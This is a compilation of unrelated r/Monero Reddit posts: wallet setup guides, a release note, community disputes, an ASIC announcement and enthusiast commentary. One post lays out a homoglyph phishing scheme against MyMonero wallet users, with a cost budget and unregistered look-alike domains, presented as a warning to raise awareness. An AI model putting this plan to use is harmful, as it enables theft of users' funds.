7. Your Ledger Monero wallet will now be generated. Note that this may take up to 5-10 minutes. Furthermore, there will be no immediate feedback in the CLI nor on the Ledger. 

8. `monero-wallet-cli` will start refreshing. Wait until it has fully refreshed. 

9. Congratulations, you can now use your Ledger Monero wallet in conjunction with the CLI.

# **Mac OS X**

We first have to ensure that we're sufficiently prepared. This entails the following:

1. This guide assumes you have already initialized your Ledger wallet and thus generated a 24 word mnemonic seed. 

2. You need to run / use CLI v0.12.2.0, which can be found [here](https://github.com/monero-project/monero/releases/tag/v0.12.2.0).  

3. You need to install the Ledger Monero app and configure your system. Instructions can be found [here](https://github.com/LedgerHQ/blue-app-monero/blob/master/doc/user/bolos-app-monero.pdf) (sections 3.1.1 and 3.2.2 in particular). In addition, make sure to set the network to `Mainnet` 

4. Note that the instructions for system configuration (section 3.2.2) on Mac OS X are quite elaborate and can be perceived as slightly convoluted. Fortunately, tficharmers has created a guide [here](https://monero.stackexchange.com/questions/8438/how-do-i-make-my-macos-detect-my-ledger-nano-s-when-plugged-in) that you can use for assistance. 

5. Your Ledger needs to be plugged in and the Ledger Monero app should be running. 

6. Either your daemon (`monerod`) should be running and preferably be fully synced or you should connect to a remote node.

Now that we're sufficiently prepared, let's start!

1. Use Finder to browse to the directory / folder `monero-wallet-cli` (CLI v0.12.2.0) is located.

2. Go to your desktop.

3. Open a new terminal (if don't know how to open a terminal, see [here](https://apple.stackexchange.com/a/256263)). 

4. Drag `monero-wallet-cli` in the terminal. It should add the full path to the terminal. Do *not* hit enter. 

5. Now type:

    `--generate-from-device <new-wallet-name> --subaddress-lookahead 3:200` 

Note that <new-wallet-name> is simply a placeholder for the actual wallet name. If you, for instance, want to name your wallet `MoneroWallet`, the command would be as follows:

`--generate-from-device MoneroWallet --subaddress-lookahead 3:200`

Note that aforementioned text will be appended to the path of `monero-wallet-cli`. Thus, before you hit enter, your terminal should look like: 

`/full/path/to/monero-wallet-cli --generate-from-device <new-wallet-name> --subaddress-lookahead 3:200`

Where the full path is, intuitively, the actual path on your Mac OS X. 

7. The CLI will, after executing aforementioned command, prompt your for a password. Make sure to set a strong password and confirm it thereafter. 

8. The Ledger will ask whether you want to export the private view key or not. First and foremost, your funds cannot be compromised with merely the private view key.

-------------------

A few final notes:

1. I'd strongly advise to test the full process first. That is, send a small amount to the wallet and subsequently restore it (using aforementioned guide) to verify that you can recover the wallet. Note that, upon recreating / restoring the wallet, you ought to append the `--restore-height` flag (with a block height *before* the height of your first transaction to the wallet) to the command in step 3 (Windows), step 5 (Mac OS X), or step 3 (Linux). More information about the restore height and how to approximate it can be found [here](https://monero.stackexchange.com/questions/7581/what-is-the-relevance-of-the-restore-height). 

2. If you use a remote node, append the `--daemon-address host:port` flag to the command in step 3 (Windows), step 5 (Mac OS X), or step 3 (Linux). 

3. If desired, you can manually tweak the `--subaddress-lookahead` value. The first value is the number of accounts and the second value is the number of subaddresses per account. Thus, if you, for instance, want to pregenerate 5 accounts with 100 subaddresses each, use `--subaddress-lookahead 5:100`. Bear in mind that, the more subaddresses you pregenerate, the longer it takes for the Ledger to create your wallet. 

4. You only have to use the `--generate-from-device` flag *once* (i.e. upon wallet creation). Thereafter, you'd basically use it similar to how you normally use the CLI. That is:

[1]  Make sure your Ledger is plugged in *and* the Monero app is running.

[2] Open `monero-wallet-cli`

[3] Enter the wallet name of your Ledger Monero wallet.

[4] Enter the password to open the wallet. 

If the Ledger wallet files are *not* in the same directory as `monero-wallet-cli`, you ought to open `monero-wallet-cli` with the `--wallet-file /path/to/wallet.keys/file` flag. Alternatively, you can copy the Ledger wallet files to the same directory as `monero-wallet-cli`. 

P.S. If you have any further questions or need assistance, please leave a comment in this thread.

"I went to a ""precious"" metals store today. There were cameras everywhere. It took them over an hour to test my coins. I also had to show ID and provide reasons for wanting fiat. This was not needed just 1 year ago. They've toughened the rules. I couldn't get cash either. For that amount a bank account was required - an account that is obviously fully traceable by the globalists. They **treated me like a criminal** just because I wanted to sell a handful of gold coins!

Goldbugs may be treated better in other countries, but try crossing borders with billion dollars in gold. They will catch you and seize your gold. Meanwhile the brainwashed zombies of our sick society will cheer on their beloved goons that they voted into power, before returning to beer and football. I sometimes wonder if the world of The Walking Dead would be an improvement over what we have now. With Monero, you can **stash billion dollars in your brain** and skip town easy. Monero is freedom. Monero allows you to bypass the zombies.

As you can see, I have good reason to say that **gold and silver are, for all practical purposes and non-trivial amounts, outdated shitcoins that are fully traceable by the globalists**. I've now dumped all of mine. There, I've said it. Now go ahead and bash me and downvote this post you goldbugs, but personally I feel like a load is off my shoulders.

I used to be a goldbug, but goldbugs just perplex me now. They just don't get it. If you think the gas clerk is ever going to accept your silver in exchange for gas or you're ever going to buy a laptop with your Krugerrand, you're totally deluded.

The way I see it, large parts of this world need to crash and burn before it can be saved.

"For better or for worse, I’ve noticed that fiat is playing every day a less important role in my life. I still use fiat to buy groceries and I still offer it as a payment method when selling my services, but it’s less important now.

Many here want Monero to #moon and that’s alright, but the ideological implications of a borderless, permission-less sound money are just too big. Maybe it’s because I work with multiple people from different countries, but sending Moneroj is a f*cking bless. It’s easy and it’s becoming easier every day with the development of new platforms around it.

Now I get myself seeing the price of things in “Monero” instead of seeing their value in fiat. It’s a psychological thing that is happening where my brain understands the value of Monero and is giving less importance to the “fiat” value.

I like the blockchain technology, so I have some other tokens in my “portfolio”. People see the value of their portfolio in either fiat or bitcoin – I see it in Monero. When I want to buy a token, I wonder how many moneroj it costs, and not how many bitcoins. In fact, I was talking to a friend and I literally said “you can buy a couple of these coins with 5 centineros”. We laughed and we started wondering if someday people will use [these denominations](https://getmonero.org/resources/moneropedia/denominations.html).

That’s it. Monero might not be the 1st place on market cap, but it’s the 1st place in my head and that’s what matters.

"First and foremost, please upgrade to this version. A blockchain resync is *not* needed. Only this version will work after the fork of January 5. Note that this fork will enable Ring CT transactions, but will not enforce them yet. 

# **Overview**

This is a necessary point release of Monero v0.10 ""Wolfram Warptangent"", and is highly recommended as it includes consensus-changing fixes to the RingCT implementation and various other bug fixes.

Some highlights of this release are:

* major changes to support the GUI
  
* adds full support for ""fluffy blocks"", a propagation improvement similar to Compact Blocks in Bitcoin Core
  
* adds in a dynamic fee system
  
* expansion of the data stored in the wallet cache, including the GUI address book
  
* switch to Borromean signatures in RingCT
  
* add Monero payment URI support to the wallet library
  
* complete overhaul of the threading system
  
* optimise the wallet blockchain refresh mechanism
  
* created a contributing guide
  
* switched to a dynamic dust threshold system
  
* added a command to compute the total coinbase
  
* major RingCT performance improvements
  
* killed off the old fast_exit mechanism, which caused more issues than anything else
  
* improved and fixed the cold wallet transaction signing mechanism
  
* overhauled the sweep_unmixable implementation
  
* fixed FreeBSD builds

##**Updating: Wallet Files**

Simply create a new directory with the 0.10.1 binaries and copy your wallet files over to there. Make sure to backup your wallet files properly. If you need any help, feel free to PM me or respond in this thread. Note that your wallet contains three files, namely wallet.keys (this is the most important file, since it contains your keys), wallet (this is the wallet cache, which contains your transaction history and private tx keys), and wallet.address (which is just your public address). In addition, if you incur a bug whilst upgrading, you can always restore your wallet with the mnemonic seed as follows:

For Mac and Linux:

`./monero-wallet-cli --restore-deterministic-wallet`

On Windows make sure to launch it from the command line. Go to the folder monero-cli-wallet is located and make sure your cursor isn't located on any of the files. Subsequently do SHIFT + right click and it will give you an option to ""Open command window here"". Lastly, type the following command:

`monero-wallet-cli.exe --restore-deterministic-wallet`

If you want to restore from the private keys instead of the mnemonic seed, replace `--restore-deterministic-wallet` with `--generate-from-keys`

##**Contributors for this Release**

This release was the direct result of 29 people who worked, largely unpaid and altruistically, to put out 481 commits containing 10 517 new lines of code. We'd like to thank them very much for their time and effort. In no particular order they are:

##**GUI Update**

Fluffypony will be building GUI binaries once he has finalized this release. Note that this could take a few days. In addition, any unforeseen errors may cause delays. "
"Church Of Monero: Enough is enough.

In the last hours something really bad happened, and i think it's necessary that the community is well aware of these facts.
&nbsp;

Some hours ago, a post, made by Xeagu, appeared here, showing a flyer for the next Monero Konferenco. This flyer showed in a very clear way the logo of The Church of Monero and a QR code. [On that very thread](https://www.reddit.com/r/Monero/comments/ash2c9/monero_konferenco/) (which now got deleted without any comment from xeagu) some community members asked for clarifications on why the Logo of the Church was appearing on the flyer, since they have nothing to do with the conference in any way, the answer we got from xeagu was: ""*I made the flier. I will be at the Konferenco. As well as at least 3 other members of the Church of Monero.*"".
&nbsp;

After this answer i got suspicious, but i got even more confused when i saw suraeNoether praising the flyer when was posted on Twitter, so i asked for clarifications on the IRC channel of the research lab. Well, i basically opened pandora's pot.
&nbsp;

Basically, Xeagu proposed himself to make the flyer for the conference, then he published directly on reddit first and then twitter, without asking for a feedback. Guess what? **he added the church logo without telling anybody, even if they have no role at all in the conference**. And this is not the worst, at the side of the logo of the church there was a QR code, which pointed to **Xeagu's personal account**!. This without any advice or warning of sort.
When called out he didn't apologize and labeled the situation ""a mistake"". Honestly, i find very hard to believe it, especially after he failed to answer many times what QR code was the flyer displaying and answered only when forced to.
&nbsp;

All the logs are public and i strongly suggest you all to give them a look to have a clear idea of what happened and why i now consider xeagu a malicious actor and the church of Monero a threat to Monero itself:

- [Logs of the conversation](https://paste.fedoraproject.org/paste/RTSlJkHXTK2YeVG~bZfgSw) started by me on #monero-research-lab. Right after we decided to move to #monero-community, a more appropriate room (sorry for the messed up format).
- [Logs of the conversation happened in #monero-community](https://paste.fedoraproject.org/paste/Q9gYk2EQgFHiduqDcHOpew) (I removed a conversation in between not related to the subject, anyone is free to check the backlog using riot/matrix or mattermost).
- [reddit post that was removed with no explanation](https://www.reddit.com/r/Monero/comments/ash2c9/monero_konferenco/). Now he published a ""clean thread""([link](https://www.reddit.com/r/Monero/comments/asor12/monero_konferenco_updated/)) with no reference to the old flyer.
- [Surae's reaction on twitter](https://twitter.com/BGGoodell/status/1098226122721034240)
- [original flyer with COM logo and QR with Xeagu's address](https://imgur.com/a/4KqEQZe)


I alredy spoke about the Church Of Monero and explained why it's dangerous [here on reddit](https://www.reddit.com/r/Monero/comments/a8u0ih/church_of_monero_as_a_toxicity_sink_what_is_your/ecdxz2q/). Xeagu always ignored the opnion of the community and kept posting things related to the church of Monero here, even after every single one of his thred get massively downvoted. **My point is that after this event looks clear that the Church Is shady, useless, controversial and negative to Monero. Its leader is clearly pushing his own agenda and doesn't care to do it in a way that damages Monero. It's unacceptable that somebody create a flyer for a Monero event and put silently the logo of his association in it an his personal QR code to receive donations. All this without saying a word to the community or the organizers**. For this reason i propose to ask the church of Monero to not post on /r/monero again, but to stay on their own subreddit, exactly as for topics as mining and speculation (/r/monerominer and /r/xmrtrader). They are clearly a negative influence. I'd like to know what's the opinion of the community about this."
"Hey, everyone, Surae here!

I just uploaded my end-of-august update to my github, because the forum seems to be acting wonky to me. You can see my update [here](https://github.com/b-g-goodell/research-lab/blob/master/publications/research-roadmaps/MRL-R001%20Priorities%20for%20Monero%20Research%20Lab/MRL_2017_Q1_Update.pdf), you can see my progress on the threshold multisignature MRL bulletin [here](https://github.com/b-g-goodell/research-lab/blob/master/publications/research-bulletins/in-prog/MRL-9999%20-%20Threshold%20Multisignatures/MRL_9999a__Threshold_CryptoNote_Signatures.pdf), and you can see an out-of-date (and not very correct) text version of the RuffCT pseudocode [here](https://github.com/b-g-goodell/research-lab/blob/master/publications/txt-standards/Ruffct.txt).

Sarang and I are going to be modifying the MRL bulletin format, so I would take formatting for granted right now. I dislike that margins jump around from page to page, I dislike a lot of little things about it, but formatting those papers is very low on my priority list right now.

The next MRL Roadmap, MRL-R002 will be out in 2-3 weeks, hopefully with a slightly nicer format! The ZK-SNARK literature review will be moving by the end of next week, the MRL-0006 on threshold multisignatures may see peer review publication because of some novel security models, and...


Well, I find myself just re-capping my end-of-August update, so ... just go check it out!"
"Shows the community will put their moneros where their mouths are :P

By my count thats 1208.38 total XMR donated :D or 24.24btc or 64,978.47USD"
"I recently got my website security tested, and the tester asked for payment in Monero rather than Bitcoin! I obliged of course.

I don't use Monero very often, so I had to wait for my daemon to catch up, but after that the payment was quick and easy.

This is the first time I've paid for a service directly in XMR :) Just wanted to share really."
"Hi. No, this is not a PSA hype post, and I'll try to keep this short (some of us are busy with development). I think I've stayed out of most or all Monero dramas but this latest one has caught my attention.

I've read some great comments regarding the ""announcement"" and found some insightful ideas and perspectives. I'm not a financial analyst, nor a seasoned trader, nor do I know everything - but what I do know is that drama tends to be intermittent: it comes, it goes; people talk, people walk: yet the beat goes on.

I understand that there are sociological relationships with any technology, and I think this is great, but I believe that, throughout any drama, the technology will remain true and, if that truth is strength; the technology will reign supreme. Myself and a few others are actually doing the work to make Monero stand the test of time; to make Monero truly the best coin out there; to ensure that Monero technology will continue to have *real* human value: a value that future generations will depend upon. This value, to me, is truth; and this truth is strength.

I personally don't believe in caring too much about the words or opinions of others or if someone is upset because they gambled and lost a bet; I believe that, if the code is unaffected, nothing of *real* value was lost. Why? Because, in our world, code value takes precedence over any other; especially over any speculative value (is that not stating the obvious?). Am I biased? I don't know. I'm paid in XMR to work on the Monero project, but I worked on Kovri for about a year without any pay - so what does that mean? If I was ever timid and weak or caved into the words or opinions of others, then Kovri wouldn't exist. If I didn't see the forest through the trees, then I wouldn't be here talking to you right now.

I'm not defending nor endorsing anyone's actions but, since the world hasn't collapsed, I would encourage everyone to keep their eye on the prize and put aside all the bullshit of others. Maybe it's easier said than done, but I do know it's doable (#kovri-dev being a good example).

To all the naysayers: if you don't know how to code, I'd suggest to start learning now so you can see how powerful Monero technology really is - and is destined to be. Seriously, if only more people spent time learning to code instead of ranting on reddit..."
"Hi Everyone,

long time lurker and Monero enthusiast here.. I know this community and subreddit is self sufficient in many ways through all the incredible support many of the users provide through the funding system so I just wanted to offer a helping hand to some of the other Monero enthusiasts who might be thinking of starting their own little project. 
Or perhaps, if you already have your own project (website, pool, e-shop.) and just need some help to get it off the ground, let me know and if the project is interesting enough, I will be sure to chip in some  funds so that you can take it where you want.

If this is not to be posted in this subreddit, I am sorry and feel free to do what you need to do with this :)

I just thought I'd give a shout about this here in case there are some creative people who are looking for a starting point!

Have a good one community!"
"Please stay on topic: this post is **only** for comments discussing the uncertainties, shortcomings, and concerns some may have about Monero.    



**NOT the positive aspects of it.**



Discussion can relate to the technology itself or economics.   



Talk about community and price is not wanted, but some discussion about it maybe allowed if it relates well.   



Be as respectful and nice as possible. This discussion has potential to be more emotionally charged as it may bring up issues that are extremely upsetting: many people are not only financially but emotionally invested in the ideas and tools around Monero.    


It's better to keep it calm then to stir the pot, so don't talk down to people, insult them for spelling/grammar,  personal insults, etc. 
This should only be calm rational discussion about the technical and economic aspects of Monero.   


""Do unto others 20% better than you'd expect them to do unto you to correct subjective error."" - Linus Pauling  
 


**How it works:**    


1. Post your concerns about Monero in reply to this main post.     


2. If you can address these concerns, or add further details to them - reply to that comment.  This will make it easily sortable    


2. Upvote the comments that are the most valid criticisms of it that have few or no real honest solutions/answers to them.   

 


The comment that mentions the biggest problems of Monero should have the most karma.   

As a community, as developers, we need to know about them. Even if they make us feel bad, we got to upvote them.

"Hiho everyone:)

Because of my work, i was recently in a Live Hacking event. I saw several ways of how scammers use social engineering and technical bugs to abuse the system and in the end, rob the user of his money. So naturally I was thinking to myself...could that be done to monero?

&nbsp;

The thing is...yes....its really not that hard and so i made the math...

&nbsp;

Everyone knows https://mymọnero.com/


Its a trustful site by one of our monero devs. Sadly there are also scam sites like mymonero.eu, who imitate the look of the real website. all links refer to the real .com website except one...the login button where you enter your wallet informations. once you entered it, all data is sent to the scammer and you, as the user, get redirected to the real mymonero website. as you are again on the login mask, you might think your browser was going crazy and there is no big deal, since you can just enter your wallet informations again to enter your wallet....but at that point its already too late and the scammer has access to your wallet.

&nbsp;

Now you are thinking, who would fall for such a stupid scam, right? Only naive and technical blind people would fall for that. Smart people would check if the domain ends in .com

&nbsp;

But have you carefully read the first mymonero.com link? Did you notice the small dot below the first O? I guess not...

This small ọ comes from another alphabet. Hackers check the special character list and compare them to the normal latin alphabet. Once they found a matching letter, they use that to scam people. 

Smartphones have small screens, a lil sunshine to blind the reader, dirty screen from fingerprints, its not much needed to oversee that lil dot on the o. Even if you check for https and if the lock beside the domain is green in the browser, it wont help you. Those two things can be easily obtained...

&nbsp;

So lets see how much this scam would cost us:

&nbsp;

>mymọnero.com Domain - **1.50 USD** on godaddy for a year, also its still available, cool
>
>domain protection for a year, so no one can use whois on us - **9 USD** 
>
>webhost for our scamsite, since its only php and html we can take the cheapest - **72 USD** per year 
>
>rest of the money to pay for google ad, so we are the top choice on google searches for mymonero - **117.50 USD**
>
>copying the mymonero.eu website and adjusting it - **free**, only need to know basic html, php and mysql

&nbsp;

If we are lucky, we will have this money back in no time with our first victim. 200 USD for potentially scamming people for a full year and maybe even earning thousands of USD, not bad...

&nbsp;

So people, please be careful with your money. Only deposit small amounts up to 100-200 in your webwallet. the rest should be really in your paperwallet or at least computer wallet.

I made this post to raise awareness for the scams, that are going on, as well to prevent someone from using exacly this scam proposed in this post.

&nbsp;

Bet the two domains mymọnero and mymonerọ are soon reserved though hehe

At the moment, i am posting this, those two domains are still available to buy.

&nbsp;

&nbsp;

Would be cool if you tip me for my effort, so i wont feel as dumb for posting this here instead of making use of that scam myself:)

Have a nice day ahead monero community!

"We're pleased to announce that we now accept Monero in full for purchases of our luxury apartments and private pool villas located on Koh Samui, Thailand. Prices range from about US$100,000 to $1,500,000.

We fully support and believe in Monero and firmly believe that certain clients will find making payment in XMR for their residence here much more convenient than paying in USD or Thai Baht and in dealing with the many pitfalls of the current international banking system. We expect to close our first Monero purchase within the next couple of months. 

Azur Samui consists of 61 apartments and 26 villas, all with amazing ocean views of the Gulf of Thailand. It has been recognized multiple times as one of the island's premier developments. More at AzurSamui.com. "

"It is important to recognize:

- Monero mining was 70%+ centralized by Bitmain for the period of many weeks to a few months (see https://www.reddit.com/r/Monero/comments/8agf6r/difficulty_drop_incoming_passed_the_75th_postfork/dwzerr0/ and https://bitinfocharts.com/comparison/hashrate-xmr.html#6m)
- Bitmain followed economic incentives and didn't brake Monero. Bitmain could have seriously destabilized Monero if it had adverserial goals.

I think we were very lucky."
"You may be aware that Bitmixer.io, the largest Bitcoin mixing service, has recently closed shop. Their admin gave his reasoning for doing so [in a thread on Bitcointalk.org](https://bitcointalk.org/index.php?topic=2042470.0)

The admin had initially recommended other coins to use if privacy was desired, but those coins [have problems with privacy](https://moneroforcash.com/monero-vs-dash-vs-zcash-vs-bitcoinmixers.php). Now, their admin is [recommending Monero](https://bitcointalk.org/index.php?topic=2042470.msg21113378#msg21113378)

>After the deep investigation I confirm that MONERO is the best privacy currency. So I strongly recommend MONERO for all people who need extra privacy."
"Because of the big hashrate increase I decided three weeks ago to help the decentralisation by turning on solo mining on two CPU cores. I got about 120H/s. So it would take decades to find a block, but I didn't do it for the money, I did it to help to keep the network decentralized. Imagine how lucky I am. At a difficulty of 98,562,106,672 I found a block with my crappy CPU.

So guys my conclusion is: Turn on solo mining, run a full node and donate some XMR to the developers! "
"I just wanted to yell at the internets that I do 'science' at a major institution and I don't remember ever seeing this level of competence in any group I have worked with. 

Look at the thing go, it's so pretty. "
"I've been reading posts saying ""There's no dev response!"" - but none of these people have checked in where the devs hang out... IRC in the #monero-dev channel.

But someone *did* ask earlier today.  And it was addressed.  Here's the full log (there are a few non-related bits in there - but I kept them for the sake of integrity - [a screenshot is also available](https://imgur.com/a/6qFtiEg) - times are US Eastern).

TL;DR: 

* The most reputable/biggest exchanges have not suspended Monero.  
* The devs are busy prepping the next big release (v0.13).
* As such, they're not going to waste time addressing fake controversy.

    11:45 AM <vegasbaby> An old, patched exploit some fork didn't account for maybe
    11:45 AM <@fluffypony> we're busy with the 0.13 release candidate, which is very very close

    11:45 AM <orbit33> I don't know, but it's def weird... as said before, to me kraken is (together with bitstamp) the most trustworthy exchange
    11:45 AM <vegasbaby> Understandable fluffypony
    11:46 AM <orbit33> they would def know if something was up, and they would certainly not take any risk
    11:46 AM <vegasbaby> And thats exciting :D
    11:46 AM <vegasbaby> Yeah thats why I don't think its anything of importance orbit33
    11:46 AM <Mibka> vegasbaby When I look at other CN coins on cryptopia many of them are in maintenance mode as of 24 sep. 2018 with the note ""at the request of the coin developer"" so you're probably right their message is bullshit
    11:46 AM <orbit33> and indeed, probably devs have other things on their mind

"We are Exantech, and we build blockchain solutions for finance services.

A few months ago, the Monero team announced a brilliant multisignature wallets feature. Unfortunately, the current workflow over multisignatures is quite cumbersome and can hardly be adopted by most of the common Monero users.

At the same time, Copay and Parity have managed to implement multisignature wallets in a very user-friendly way. Taking their experience into account, we decided to build an open-source software suite with apps and backend service that would provide a secure way of exchanging key images and outputs, which is crucial for the work of a shared wallet.

We believe that our project can improve user experience in the whole Monero ecosystem and will allow more users to adopt this feature.

We are planning to release our Android application and backend service in a few weeks. You can follow the current project status and our latest news at [https://wallet.exan.tech](https://wallet.exan.tech)

Share your ideas on the possible use cases of the shared wallets with us!"
"This confirms that ASIC miners have existed for quite a while.

All new Antminer X3 to mine CryptoNight coins!

webmaster@bitmaintech.com to me 8 minutes ago

Dear subscriber,

We are proud and happy to announce that we are launching the all-new Antminer X3, a new Antminer model for mining cryptocurrencies based on the hashing algorithm CryptoNight.

The Antminer X3 delivers a minmum hashrate of 220KH/s while consuming 550W of total power.

To prevent hoarding by certain users or resellers and to ensure that more individual miners in different time zones around the world are able to order this new ASIC miner, we have made some changes:

There is a limit of one miner per user for all orders in the current (two) batches.
We will release both these batches with an equal stock thrice today: at 3PM, 6pm and 9PM (15 March, GMT+8).
Click below to learn the price or to order after the scheduled time of launch:

From product page:
11999 USD

Hashing algorithm: CryptoNight
Power consumption: 550W 
Hashrate: 220KH/s

These are the most conservative estimates. We expect the miners to deliver higher performance and efficiency when they are ready to ship.

**2. There are financial risks associated with mining cryptocurrencies. These risks can be related to changes in exchange rate of the cryptocurrency or to changes in the algorithm that is used to mine the cryptocurrency. Please deliberate well before making a purchase because we will not accept any requests for refund for orders of this batch.**

3. To ensure that more buyers around the world can purchase miners in this batch, we have set a limit of one miner per user .

4. Please select the correct address for shipping before you submit your order because, for this batch, the shipping address cannot be changed after the order has been submitted.

5. The shipping cost has been updated by our logistics’ service provider recently. Therefore, the shipping cost for batches that are to be shipped after April 2018 will be slightly different (likely lower) than those that are to be shipped before April 2018.

6. The shipping for this batch will start on a first-order-first-ship basis on 15 May 2018 for orders that Bitmain has received full payment for. We advise you to research and prepare in advance for the customs' clearance in your country to avoid delays or unexpected costs.

7. You will need an ATX PSU with at least 10 six-pin PCIe connectors. There are 3 six-pin PCIe connectors on each hashing board and all three need to be connected to the PSU for the hashing board to operate. Do not connect more than one PSU to the same hashing board. Bitmain recommends the APW3++ to power the X3

8. Separate power supply to control board: there is one additional six-pin PCIe connector on the IO board which must be connected to the PSU to get power. Be sure to power on the miner only after all the 10 PCIe connectors are connected to a power supply.








I believe the manufacturers have been mining the cryptonight algorithm starting with September 2017.

Do you think that the ASIC manufactures are not to blame for the network and difficulty spikes from October ? (A similar chart can be seen for Electroneum also)

https://bitinfocharts.com/comparison/monero-hashrate.html

Current Monero Hash rate is 960 MegaHashes/s (Electroneum has about 363 I think).

Before the spike in September 2017 the hashrate was 160-170 MegaHashes. That's about 6x increase in just a few months for Monero alone.  Taking Electroneum also into account that is an increase of hashing power of 480.000 Vegas. ... That doesn't sound right considering the supply was limited, now if you take into account that each of these miners is capable of 220.000 hashes/s, than that is 4363 X3 devices, which sounds totally doable for a multi billion $ company.

These increases happened from one day to the other, it was not gradual.

WebMiners can not explain this, CPU miners the same. Casual user mining or even botnets happen more organic and gradually, not instantly like we can see in the charts.

"
We can lower difficulty and an available Vegas! Have a blessed year ahead

"A milestone for Monero community! 
"
"Hello Monero Community,

I've been working on a Monero Raspberry Pi side project for many months now.

Website: [iCryptoNode.com](https://icryptonode.com/)

The goal is to make a managing and operating your own Monero node as simple as possible so you don't have to rely on third-party remote nodes.

Everything is open source, so you can build your own rather than buying pre-built. Everything will always be open source for audit and for improvement by the community.

Github: [iCryptoNode Github](https://github.com/seibelj/iCryptoNode)

I will be continuing to add features and improving the software based on feedback.

I hope this is useful for the Monero community and enhance the decentralized economy.

EDIT: Yes, you can pay with XMR and other cryptos. Shopify doesn't have a way to hide the Paypal and Google pay buttons when you view your cart, just click ""checkout"" and then all the payment options appear."
" 1. What is your data retention policy? Especially, I'm interested do you keep and for how long account access IP logs.  


2. Have you ever been contacted by any law enforcement to provide data and did you provided them with anything?  


3.  In case that law enforcement request data from you, what can you  provide and to which extent in will compromise security of your user? "
"Sincere question, why is it taking so long? I'm not a programmer. Is there some feature of Monero that makes it incompatible with for example Ledger?

At this moment (and the window may be passing), there is no currency like Monero. It has the ability to leave all the others in the dust. IMO, the only thing holding it back now is hardware wallet support. Who in their right mind wants to store large amounts of anonymous cash on online exchanges or virus filled computers? Not me.
"
"Thank you Monero for the convenience you've provided me. I'm working abroad in a country that is hard to get money our of. Since I owe my dad money, I just buy Bitcoin on LocalBitcoins, convert it into Monero because I'm a purist, and send it to him 10,000 KM away. He receives it in 2 seconds and I wipe an equivalent USD amount of debt off my books. I red-pilled my dad on free markets, financial sovereignty, privacy, and freedom, so he's much less reluctant to accept Monero now. I pay my gratitude forward by contributing what I can to worthy FFS proposals."
"Hansa was a major darknet market taken down in July, 2017. The details of how this market was compromised was not known and this is one of the first articles to disclose details. Apparently a single Bitcoin transaction was the break law enforcement needed to find the location of the servers. Probably a good SHUM addition but I am not sure how to request a submission.

https://www.wired.com/story/hansa-dutch-police-sting-operation/

> Instead, they decided to stick with their stealthy takeover plan, and spent the ensuing months poring over evidence—even as the site continued its brisk narcotics trade—in an attempt to locate the Hansa servers again and quietly hijack them. Finally in April 2017, they got another lucky break: The alleged administrators had made a bitcoin payment from an address that had been included in those same IRC chatlogs. Using the blockchain analysis software Chainalysis, the police could see that payment went to a bitcoin payment provider with an office in the Netherlands. And when the police sent that bitcoin payment firm a legal demand to cough up more information, it identified the recipient of that transaction as another hosting company, this time in Lithuania."
"Hi, SerHack here. 
Today I am celebrating the first anniversary of SerHack (me) working with the Monero Community. In this post I would like to review my journey after joining the world of Monero!

Exactly one year ago, I decided to navigate to the (old) Monero website where I could retrieve a lot of information about the Monero project. The website looked graphically very ugly and it was not obviously not made for “ease of use” for the newbie, however I was able to find what I was looking for.

A friend suggested to me, that I should join to this project since my programming skills were amazing and I believe in open source projects. ""That seems a fantastic project"" I thought, but I had another problem: “How may I best help the Monero Community”?

After some days of deliberation, I decided to join the Slack platform and contact /u/rehrar , a web developer, who was  working on the redesign of the GetMonero.org Website. He suggested to me that I should develop a project that could impact a large number of the Monero community and could simplify a merchant's life.  So began “Monero Integrations”
Then I decided to ask the wrong questions in the wrong place!

> <_Slack> <serhack> hello

> <_Slack> <serhack> I would have xmr

> <_Slack> <serhack> any market?

> <_Slack> <serhack> I have only paypal :(

F*** me. How could I be so stupid and sound like such a ""scammer”?  How could the Monero community trust a person who has just asked for Monero and wants to pay with PayPal? 
However it was amazing how the community was able to trust an unknown person (me) and then declared that I was able to develop the entire project.

In the [post](https://www.reddit.com/r/Monero/comments/6e222m/monero_web_apps_integrations/) posted on Reddit by Rehrar , it seems that a small part of the Monero community may not trust me. However, with or without some of the community’s support, I intended to create this new project.

[Monero Integrations](https://monerointegrations.com) was perfect for my goals since I have had some experiences in development of payment gateways.  Then myself and /u/cryptochangements released over five complete [payment gateways](https://github.com/monero-integrations) for Monero the cryptocurrency project.

I really enjoyed how the community responded to this project and all my hard work. While I was developing the project I had contact with many such as fluffypony, the Monero lead maintainer and Justin Ehrenhofer.  Students, developers, technicians and newbie’s contacted me asking lots of questions and I've answered everybody that I could.

During the development of “Monero Integrations” I also started another project called [“Mastering Monero”](https://masteringmonero.com) which is a book resource which aims to provide anybody with information about everything Monero.  At the moment, I do not want to reveal more information about this project as the community like surprises! I want to create a sort of suspense for the release of Mastering Monero.

It's been a great year! I look forward to next year, wondering what more I will be write about."
"Congrats to all those involved. I know everyone here appreciates the hard work you all put in.

Viva Monero!"
"Went to a Tone Vays talk tonight and he played the famous Milton Friedman ""digital cash"" video. In one of his slides he presented the main use cases for Bitcoin, summarized in an article he had published in 2016.  They all rely on privacy.  I realized why I'd been avoiding Bitcoin meet-ups -- the misinformation is as rampant in real life as it is on the internet, and supposedly knowledgable people are spreading it.

http://www.libertylifetrail.com/2016/04/04/the-top-use-cases-for-bitcoin/

His talk was on point, but he was talking about the wrong coin.  None of these are use cases for Bitcoin any more (and maybe never were).  In time people will wake up to Monero, but their house will have already caught fire."
"After the [latest incident involving a member of the Church of Monero](https://www.reddit.com/r/Monero/comments/asqrbu/church_of_monero_enough_is_enough_how_the_leader/), it has become apparent that religion has no place in a subreddit of a technology project. Therefore, any posts involving Monero and religion are now considered off-topic and will be removed. The moderator team feels this is consistent with the desires of the community.  "
"This morning Monero hit block height 1546000, and hard forked for the sixth time in its history.

Here’s to a successful ~~hard fork~~ network upgrade!"
"It may never reach number 1, but it will always be around and do well because it’s the best option for people who like their privacy."
"Another [17 pull requests merged](https://github.com/monero-project/monero/commits/master) so far today. Great job everyone, what a priceless active community!"
"With each big price increase comes a new influx of noobs. This is good for Monero, but it is up to the original community to welcome them in a way that brings them up to speed effectively. It would be tragic for such a great community to begin moving into the direction of the Bitcoin community, where the signal is often drowned out by noise from people who either don't care about the technical aspects, or are outright malicious.

Be diligent. Encourage price talk to move to /r/xmrtrader, and encourage good questions to get asked on Stackexchange. There are people out there who do not want Monero to exist, so call out disinfo campaigns and thread derailers. 

So far, this community has done a great job, but that will become more difficult as popularity grows. We're all part of something that can help provide true privacy and freedom in an age where those traits are quickly vanishing. So please, keep being excellent. "

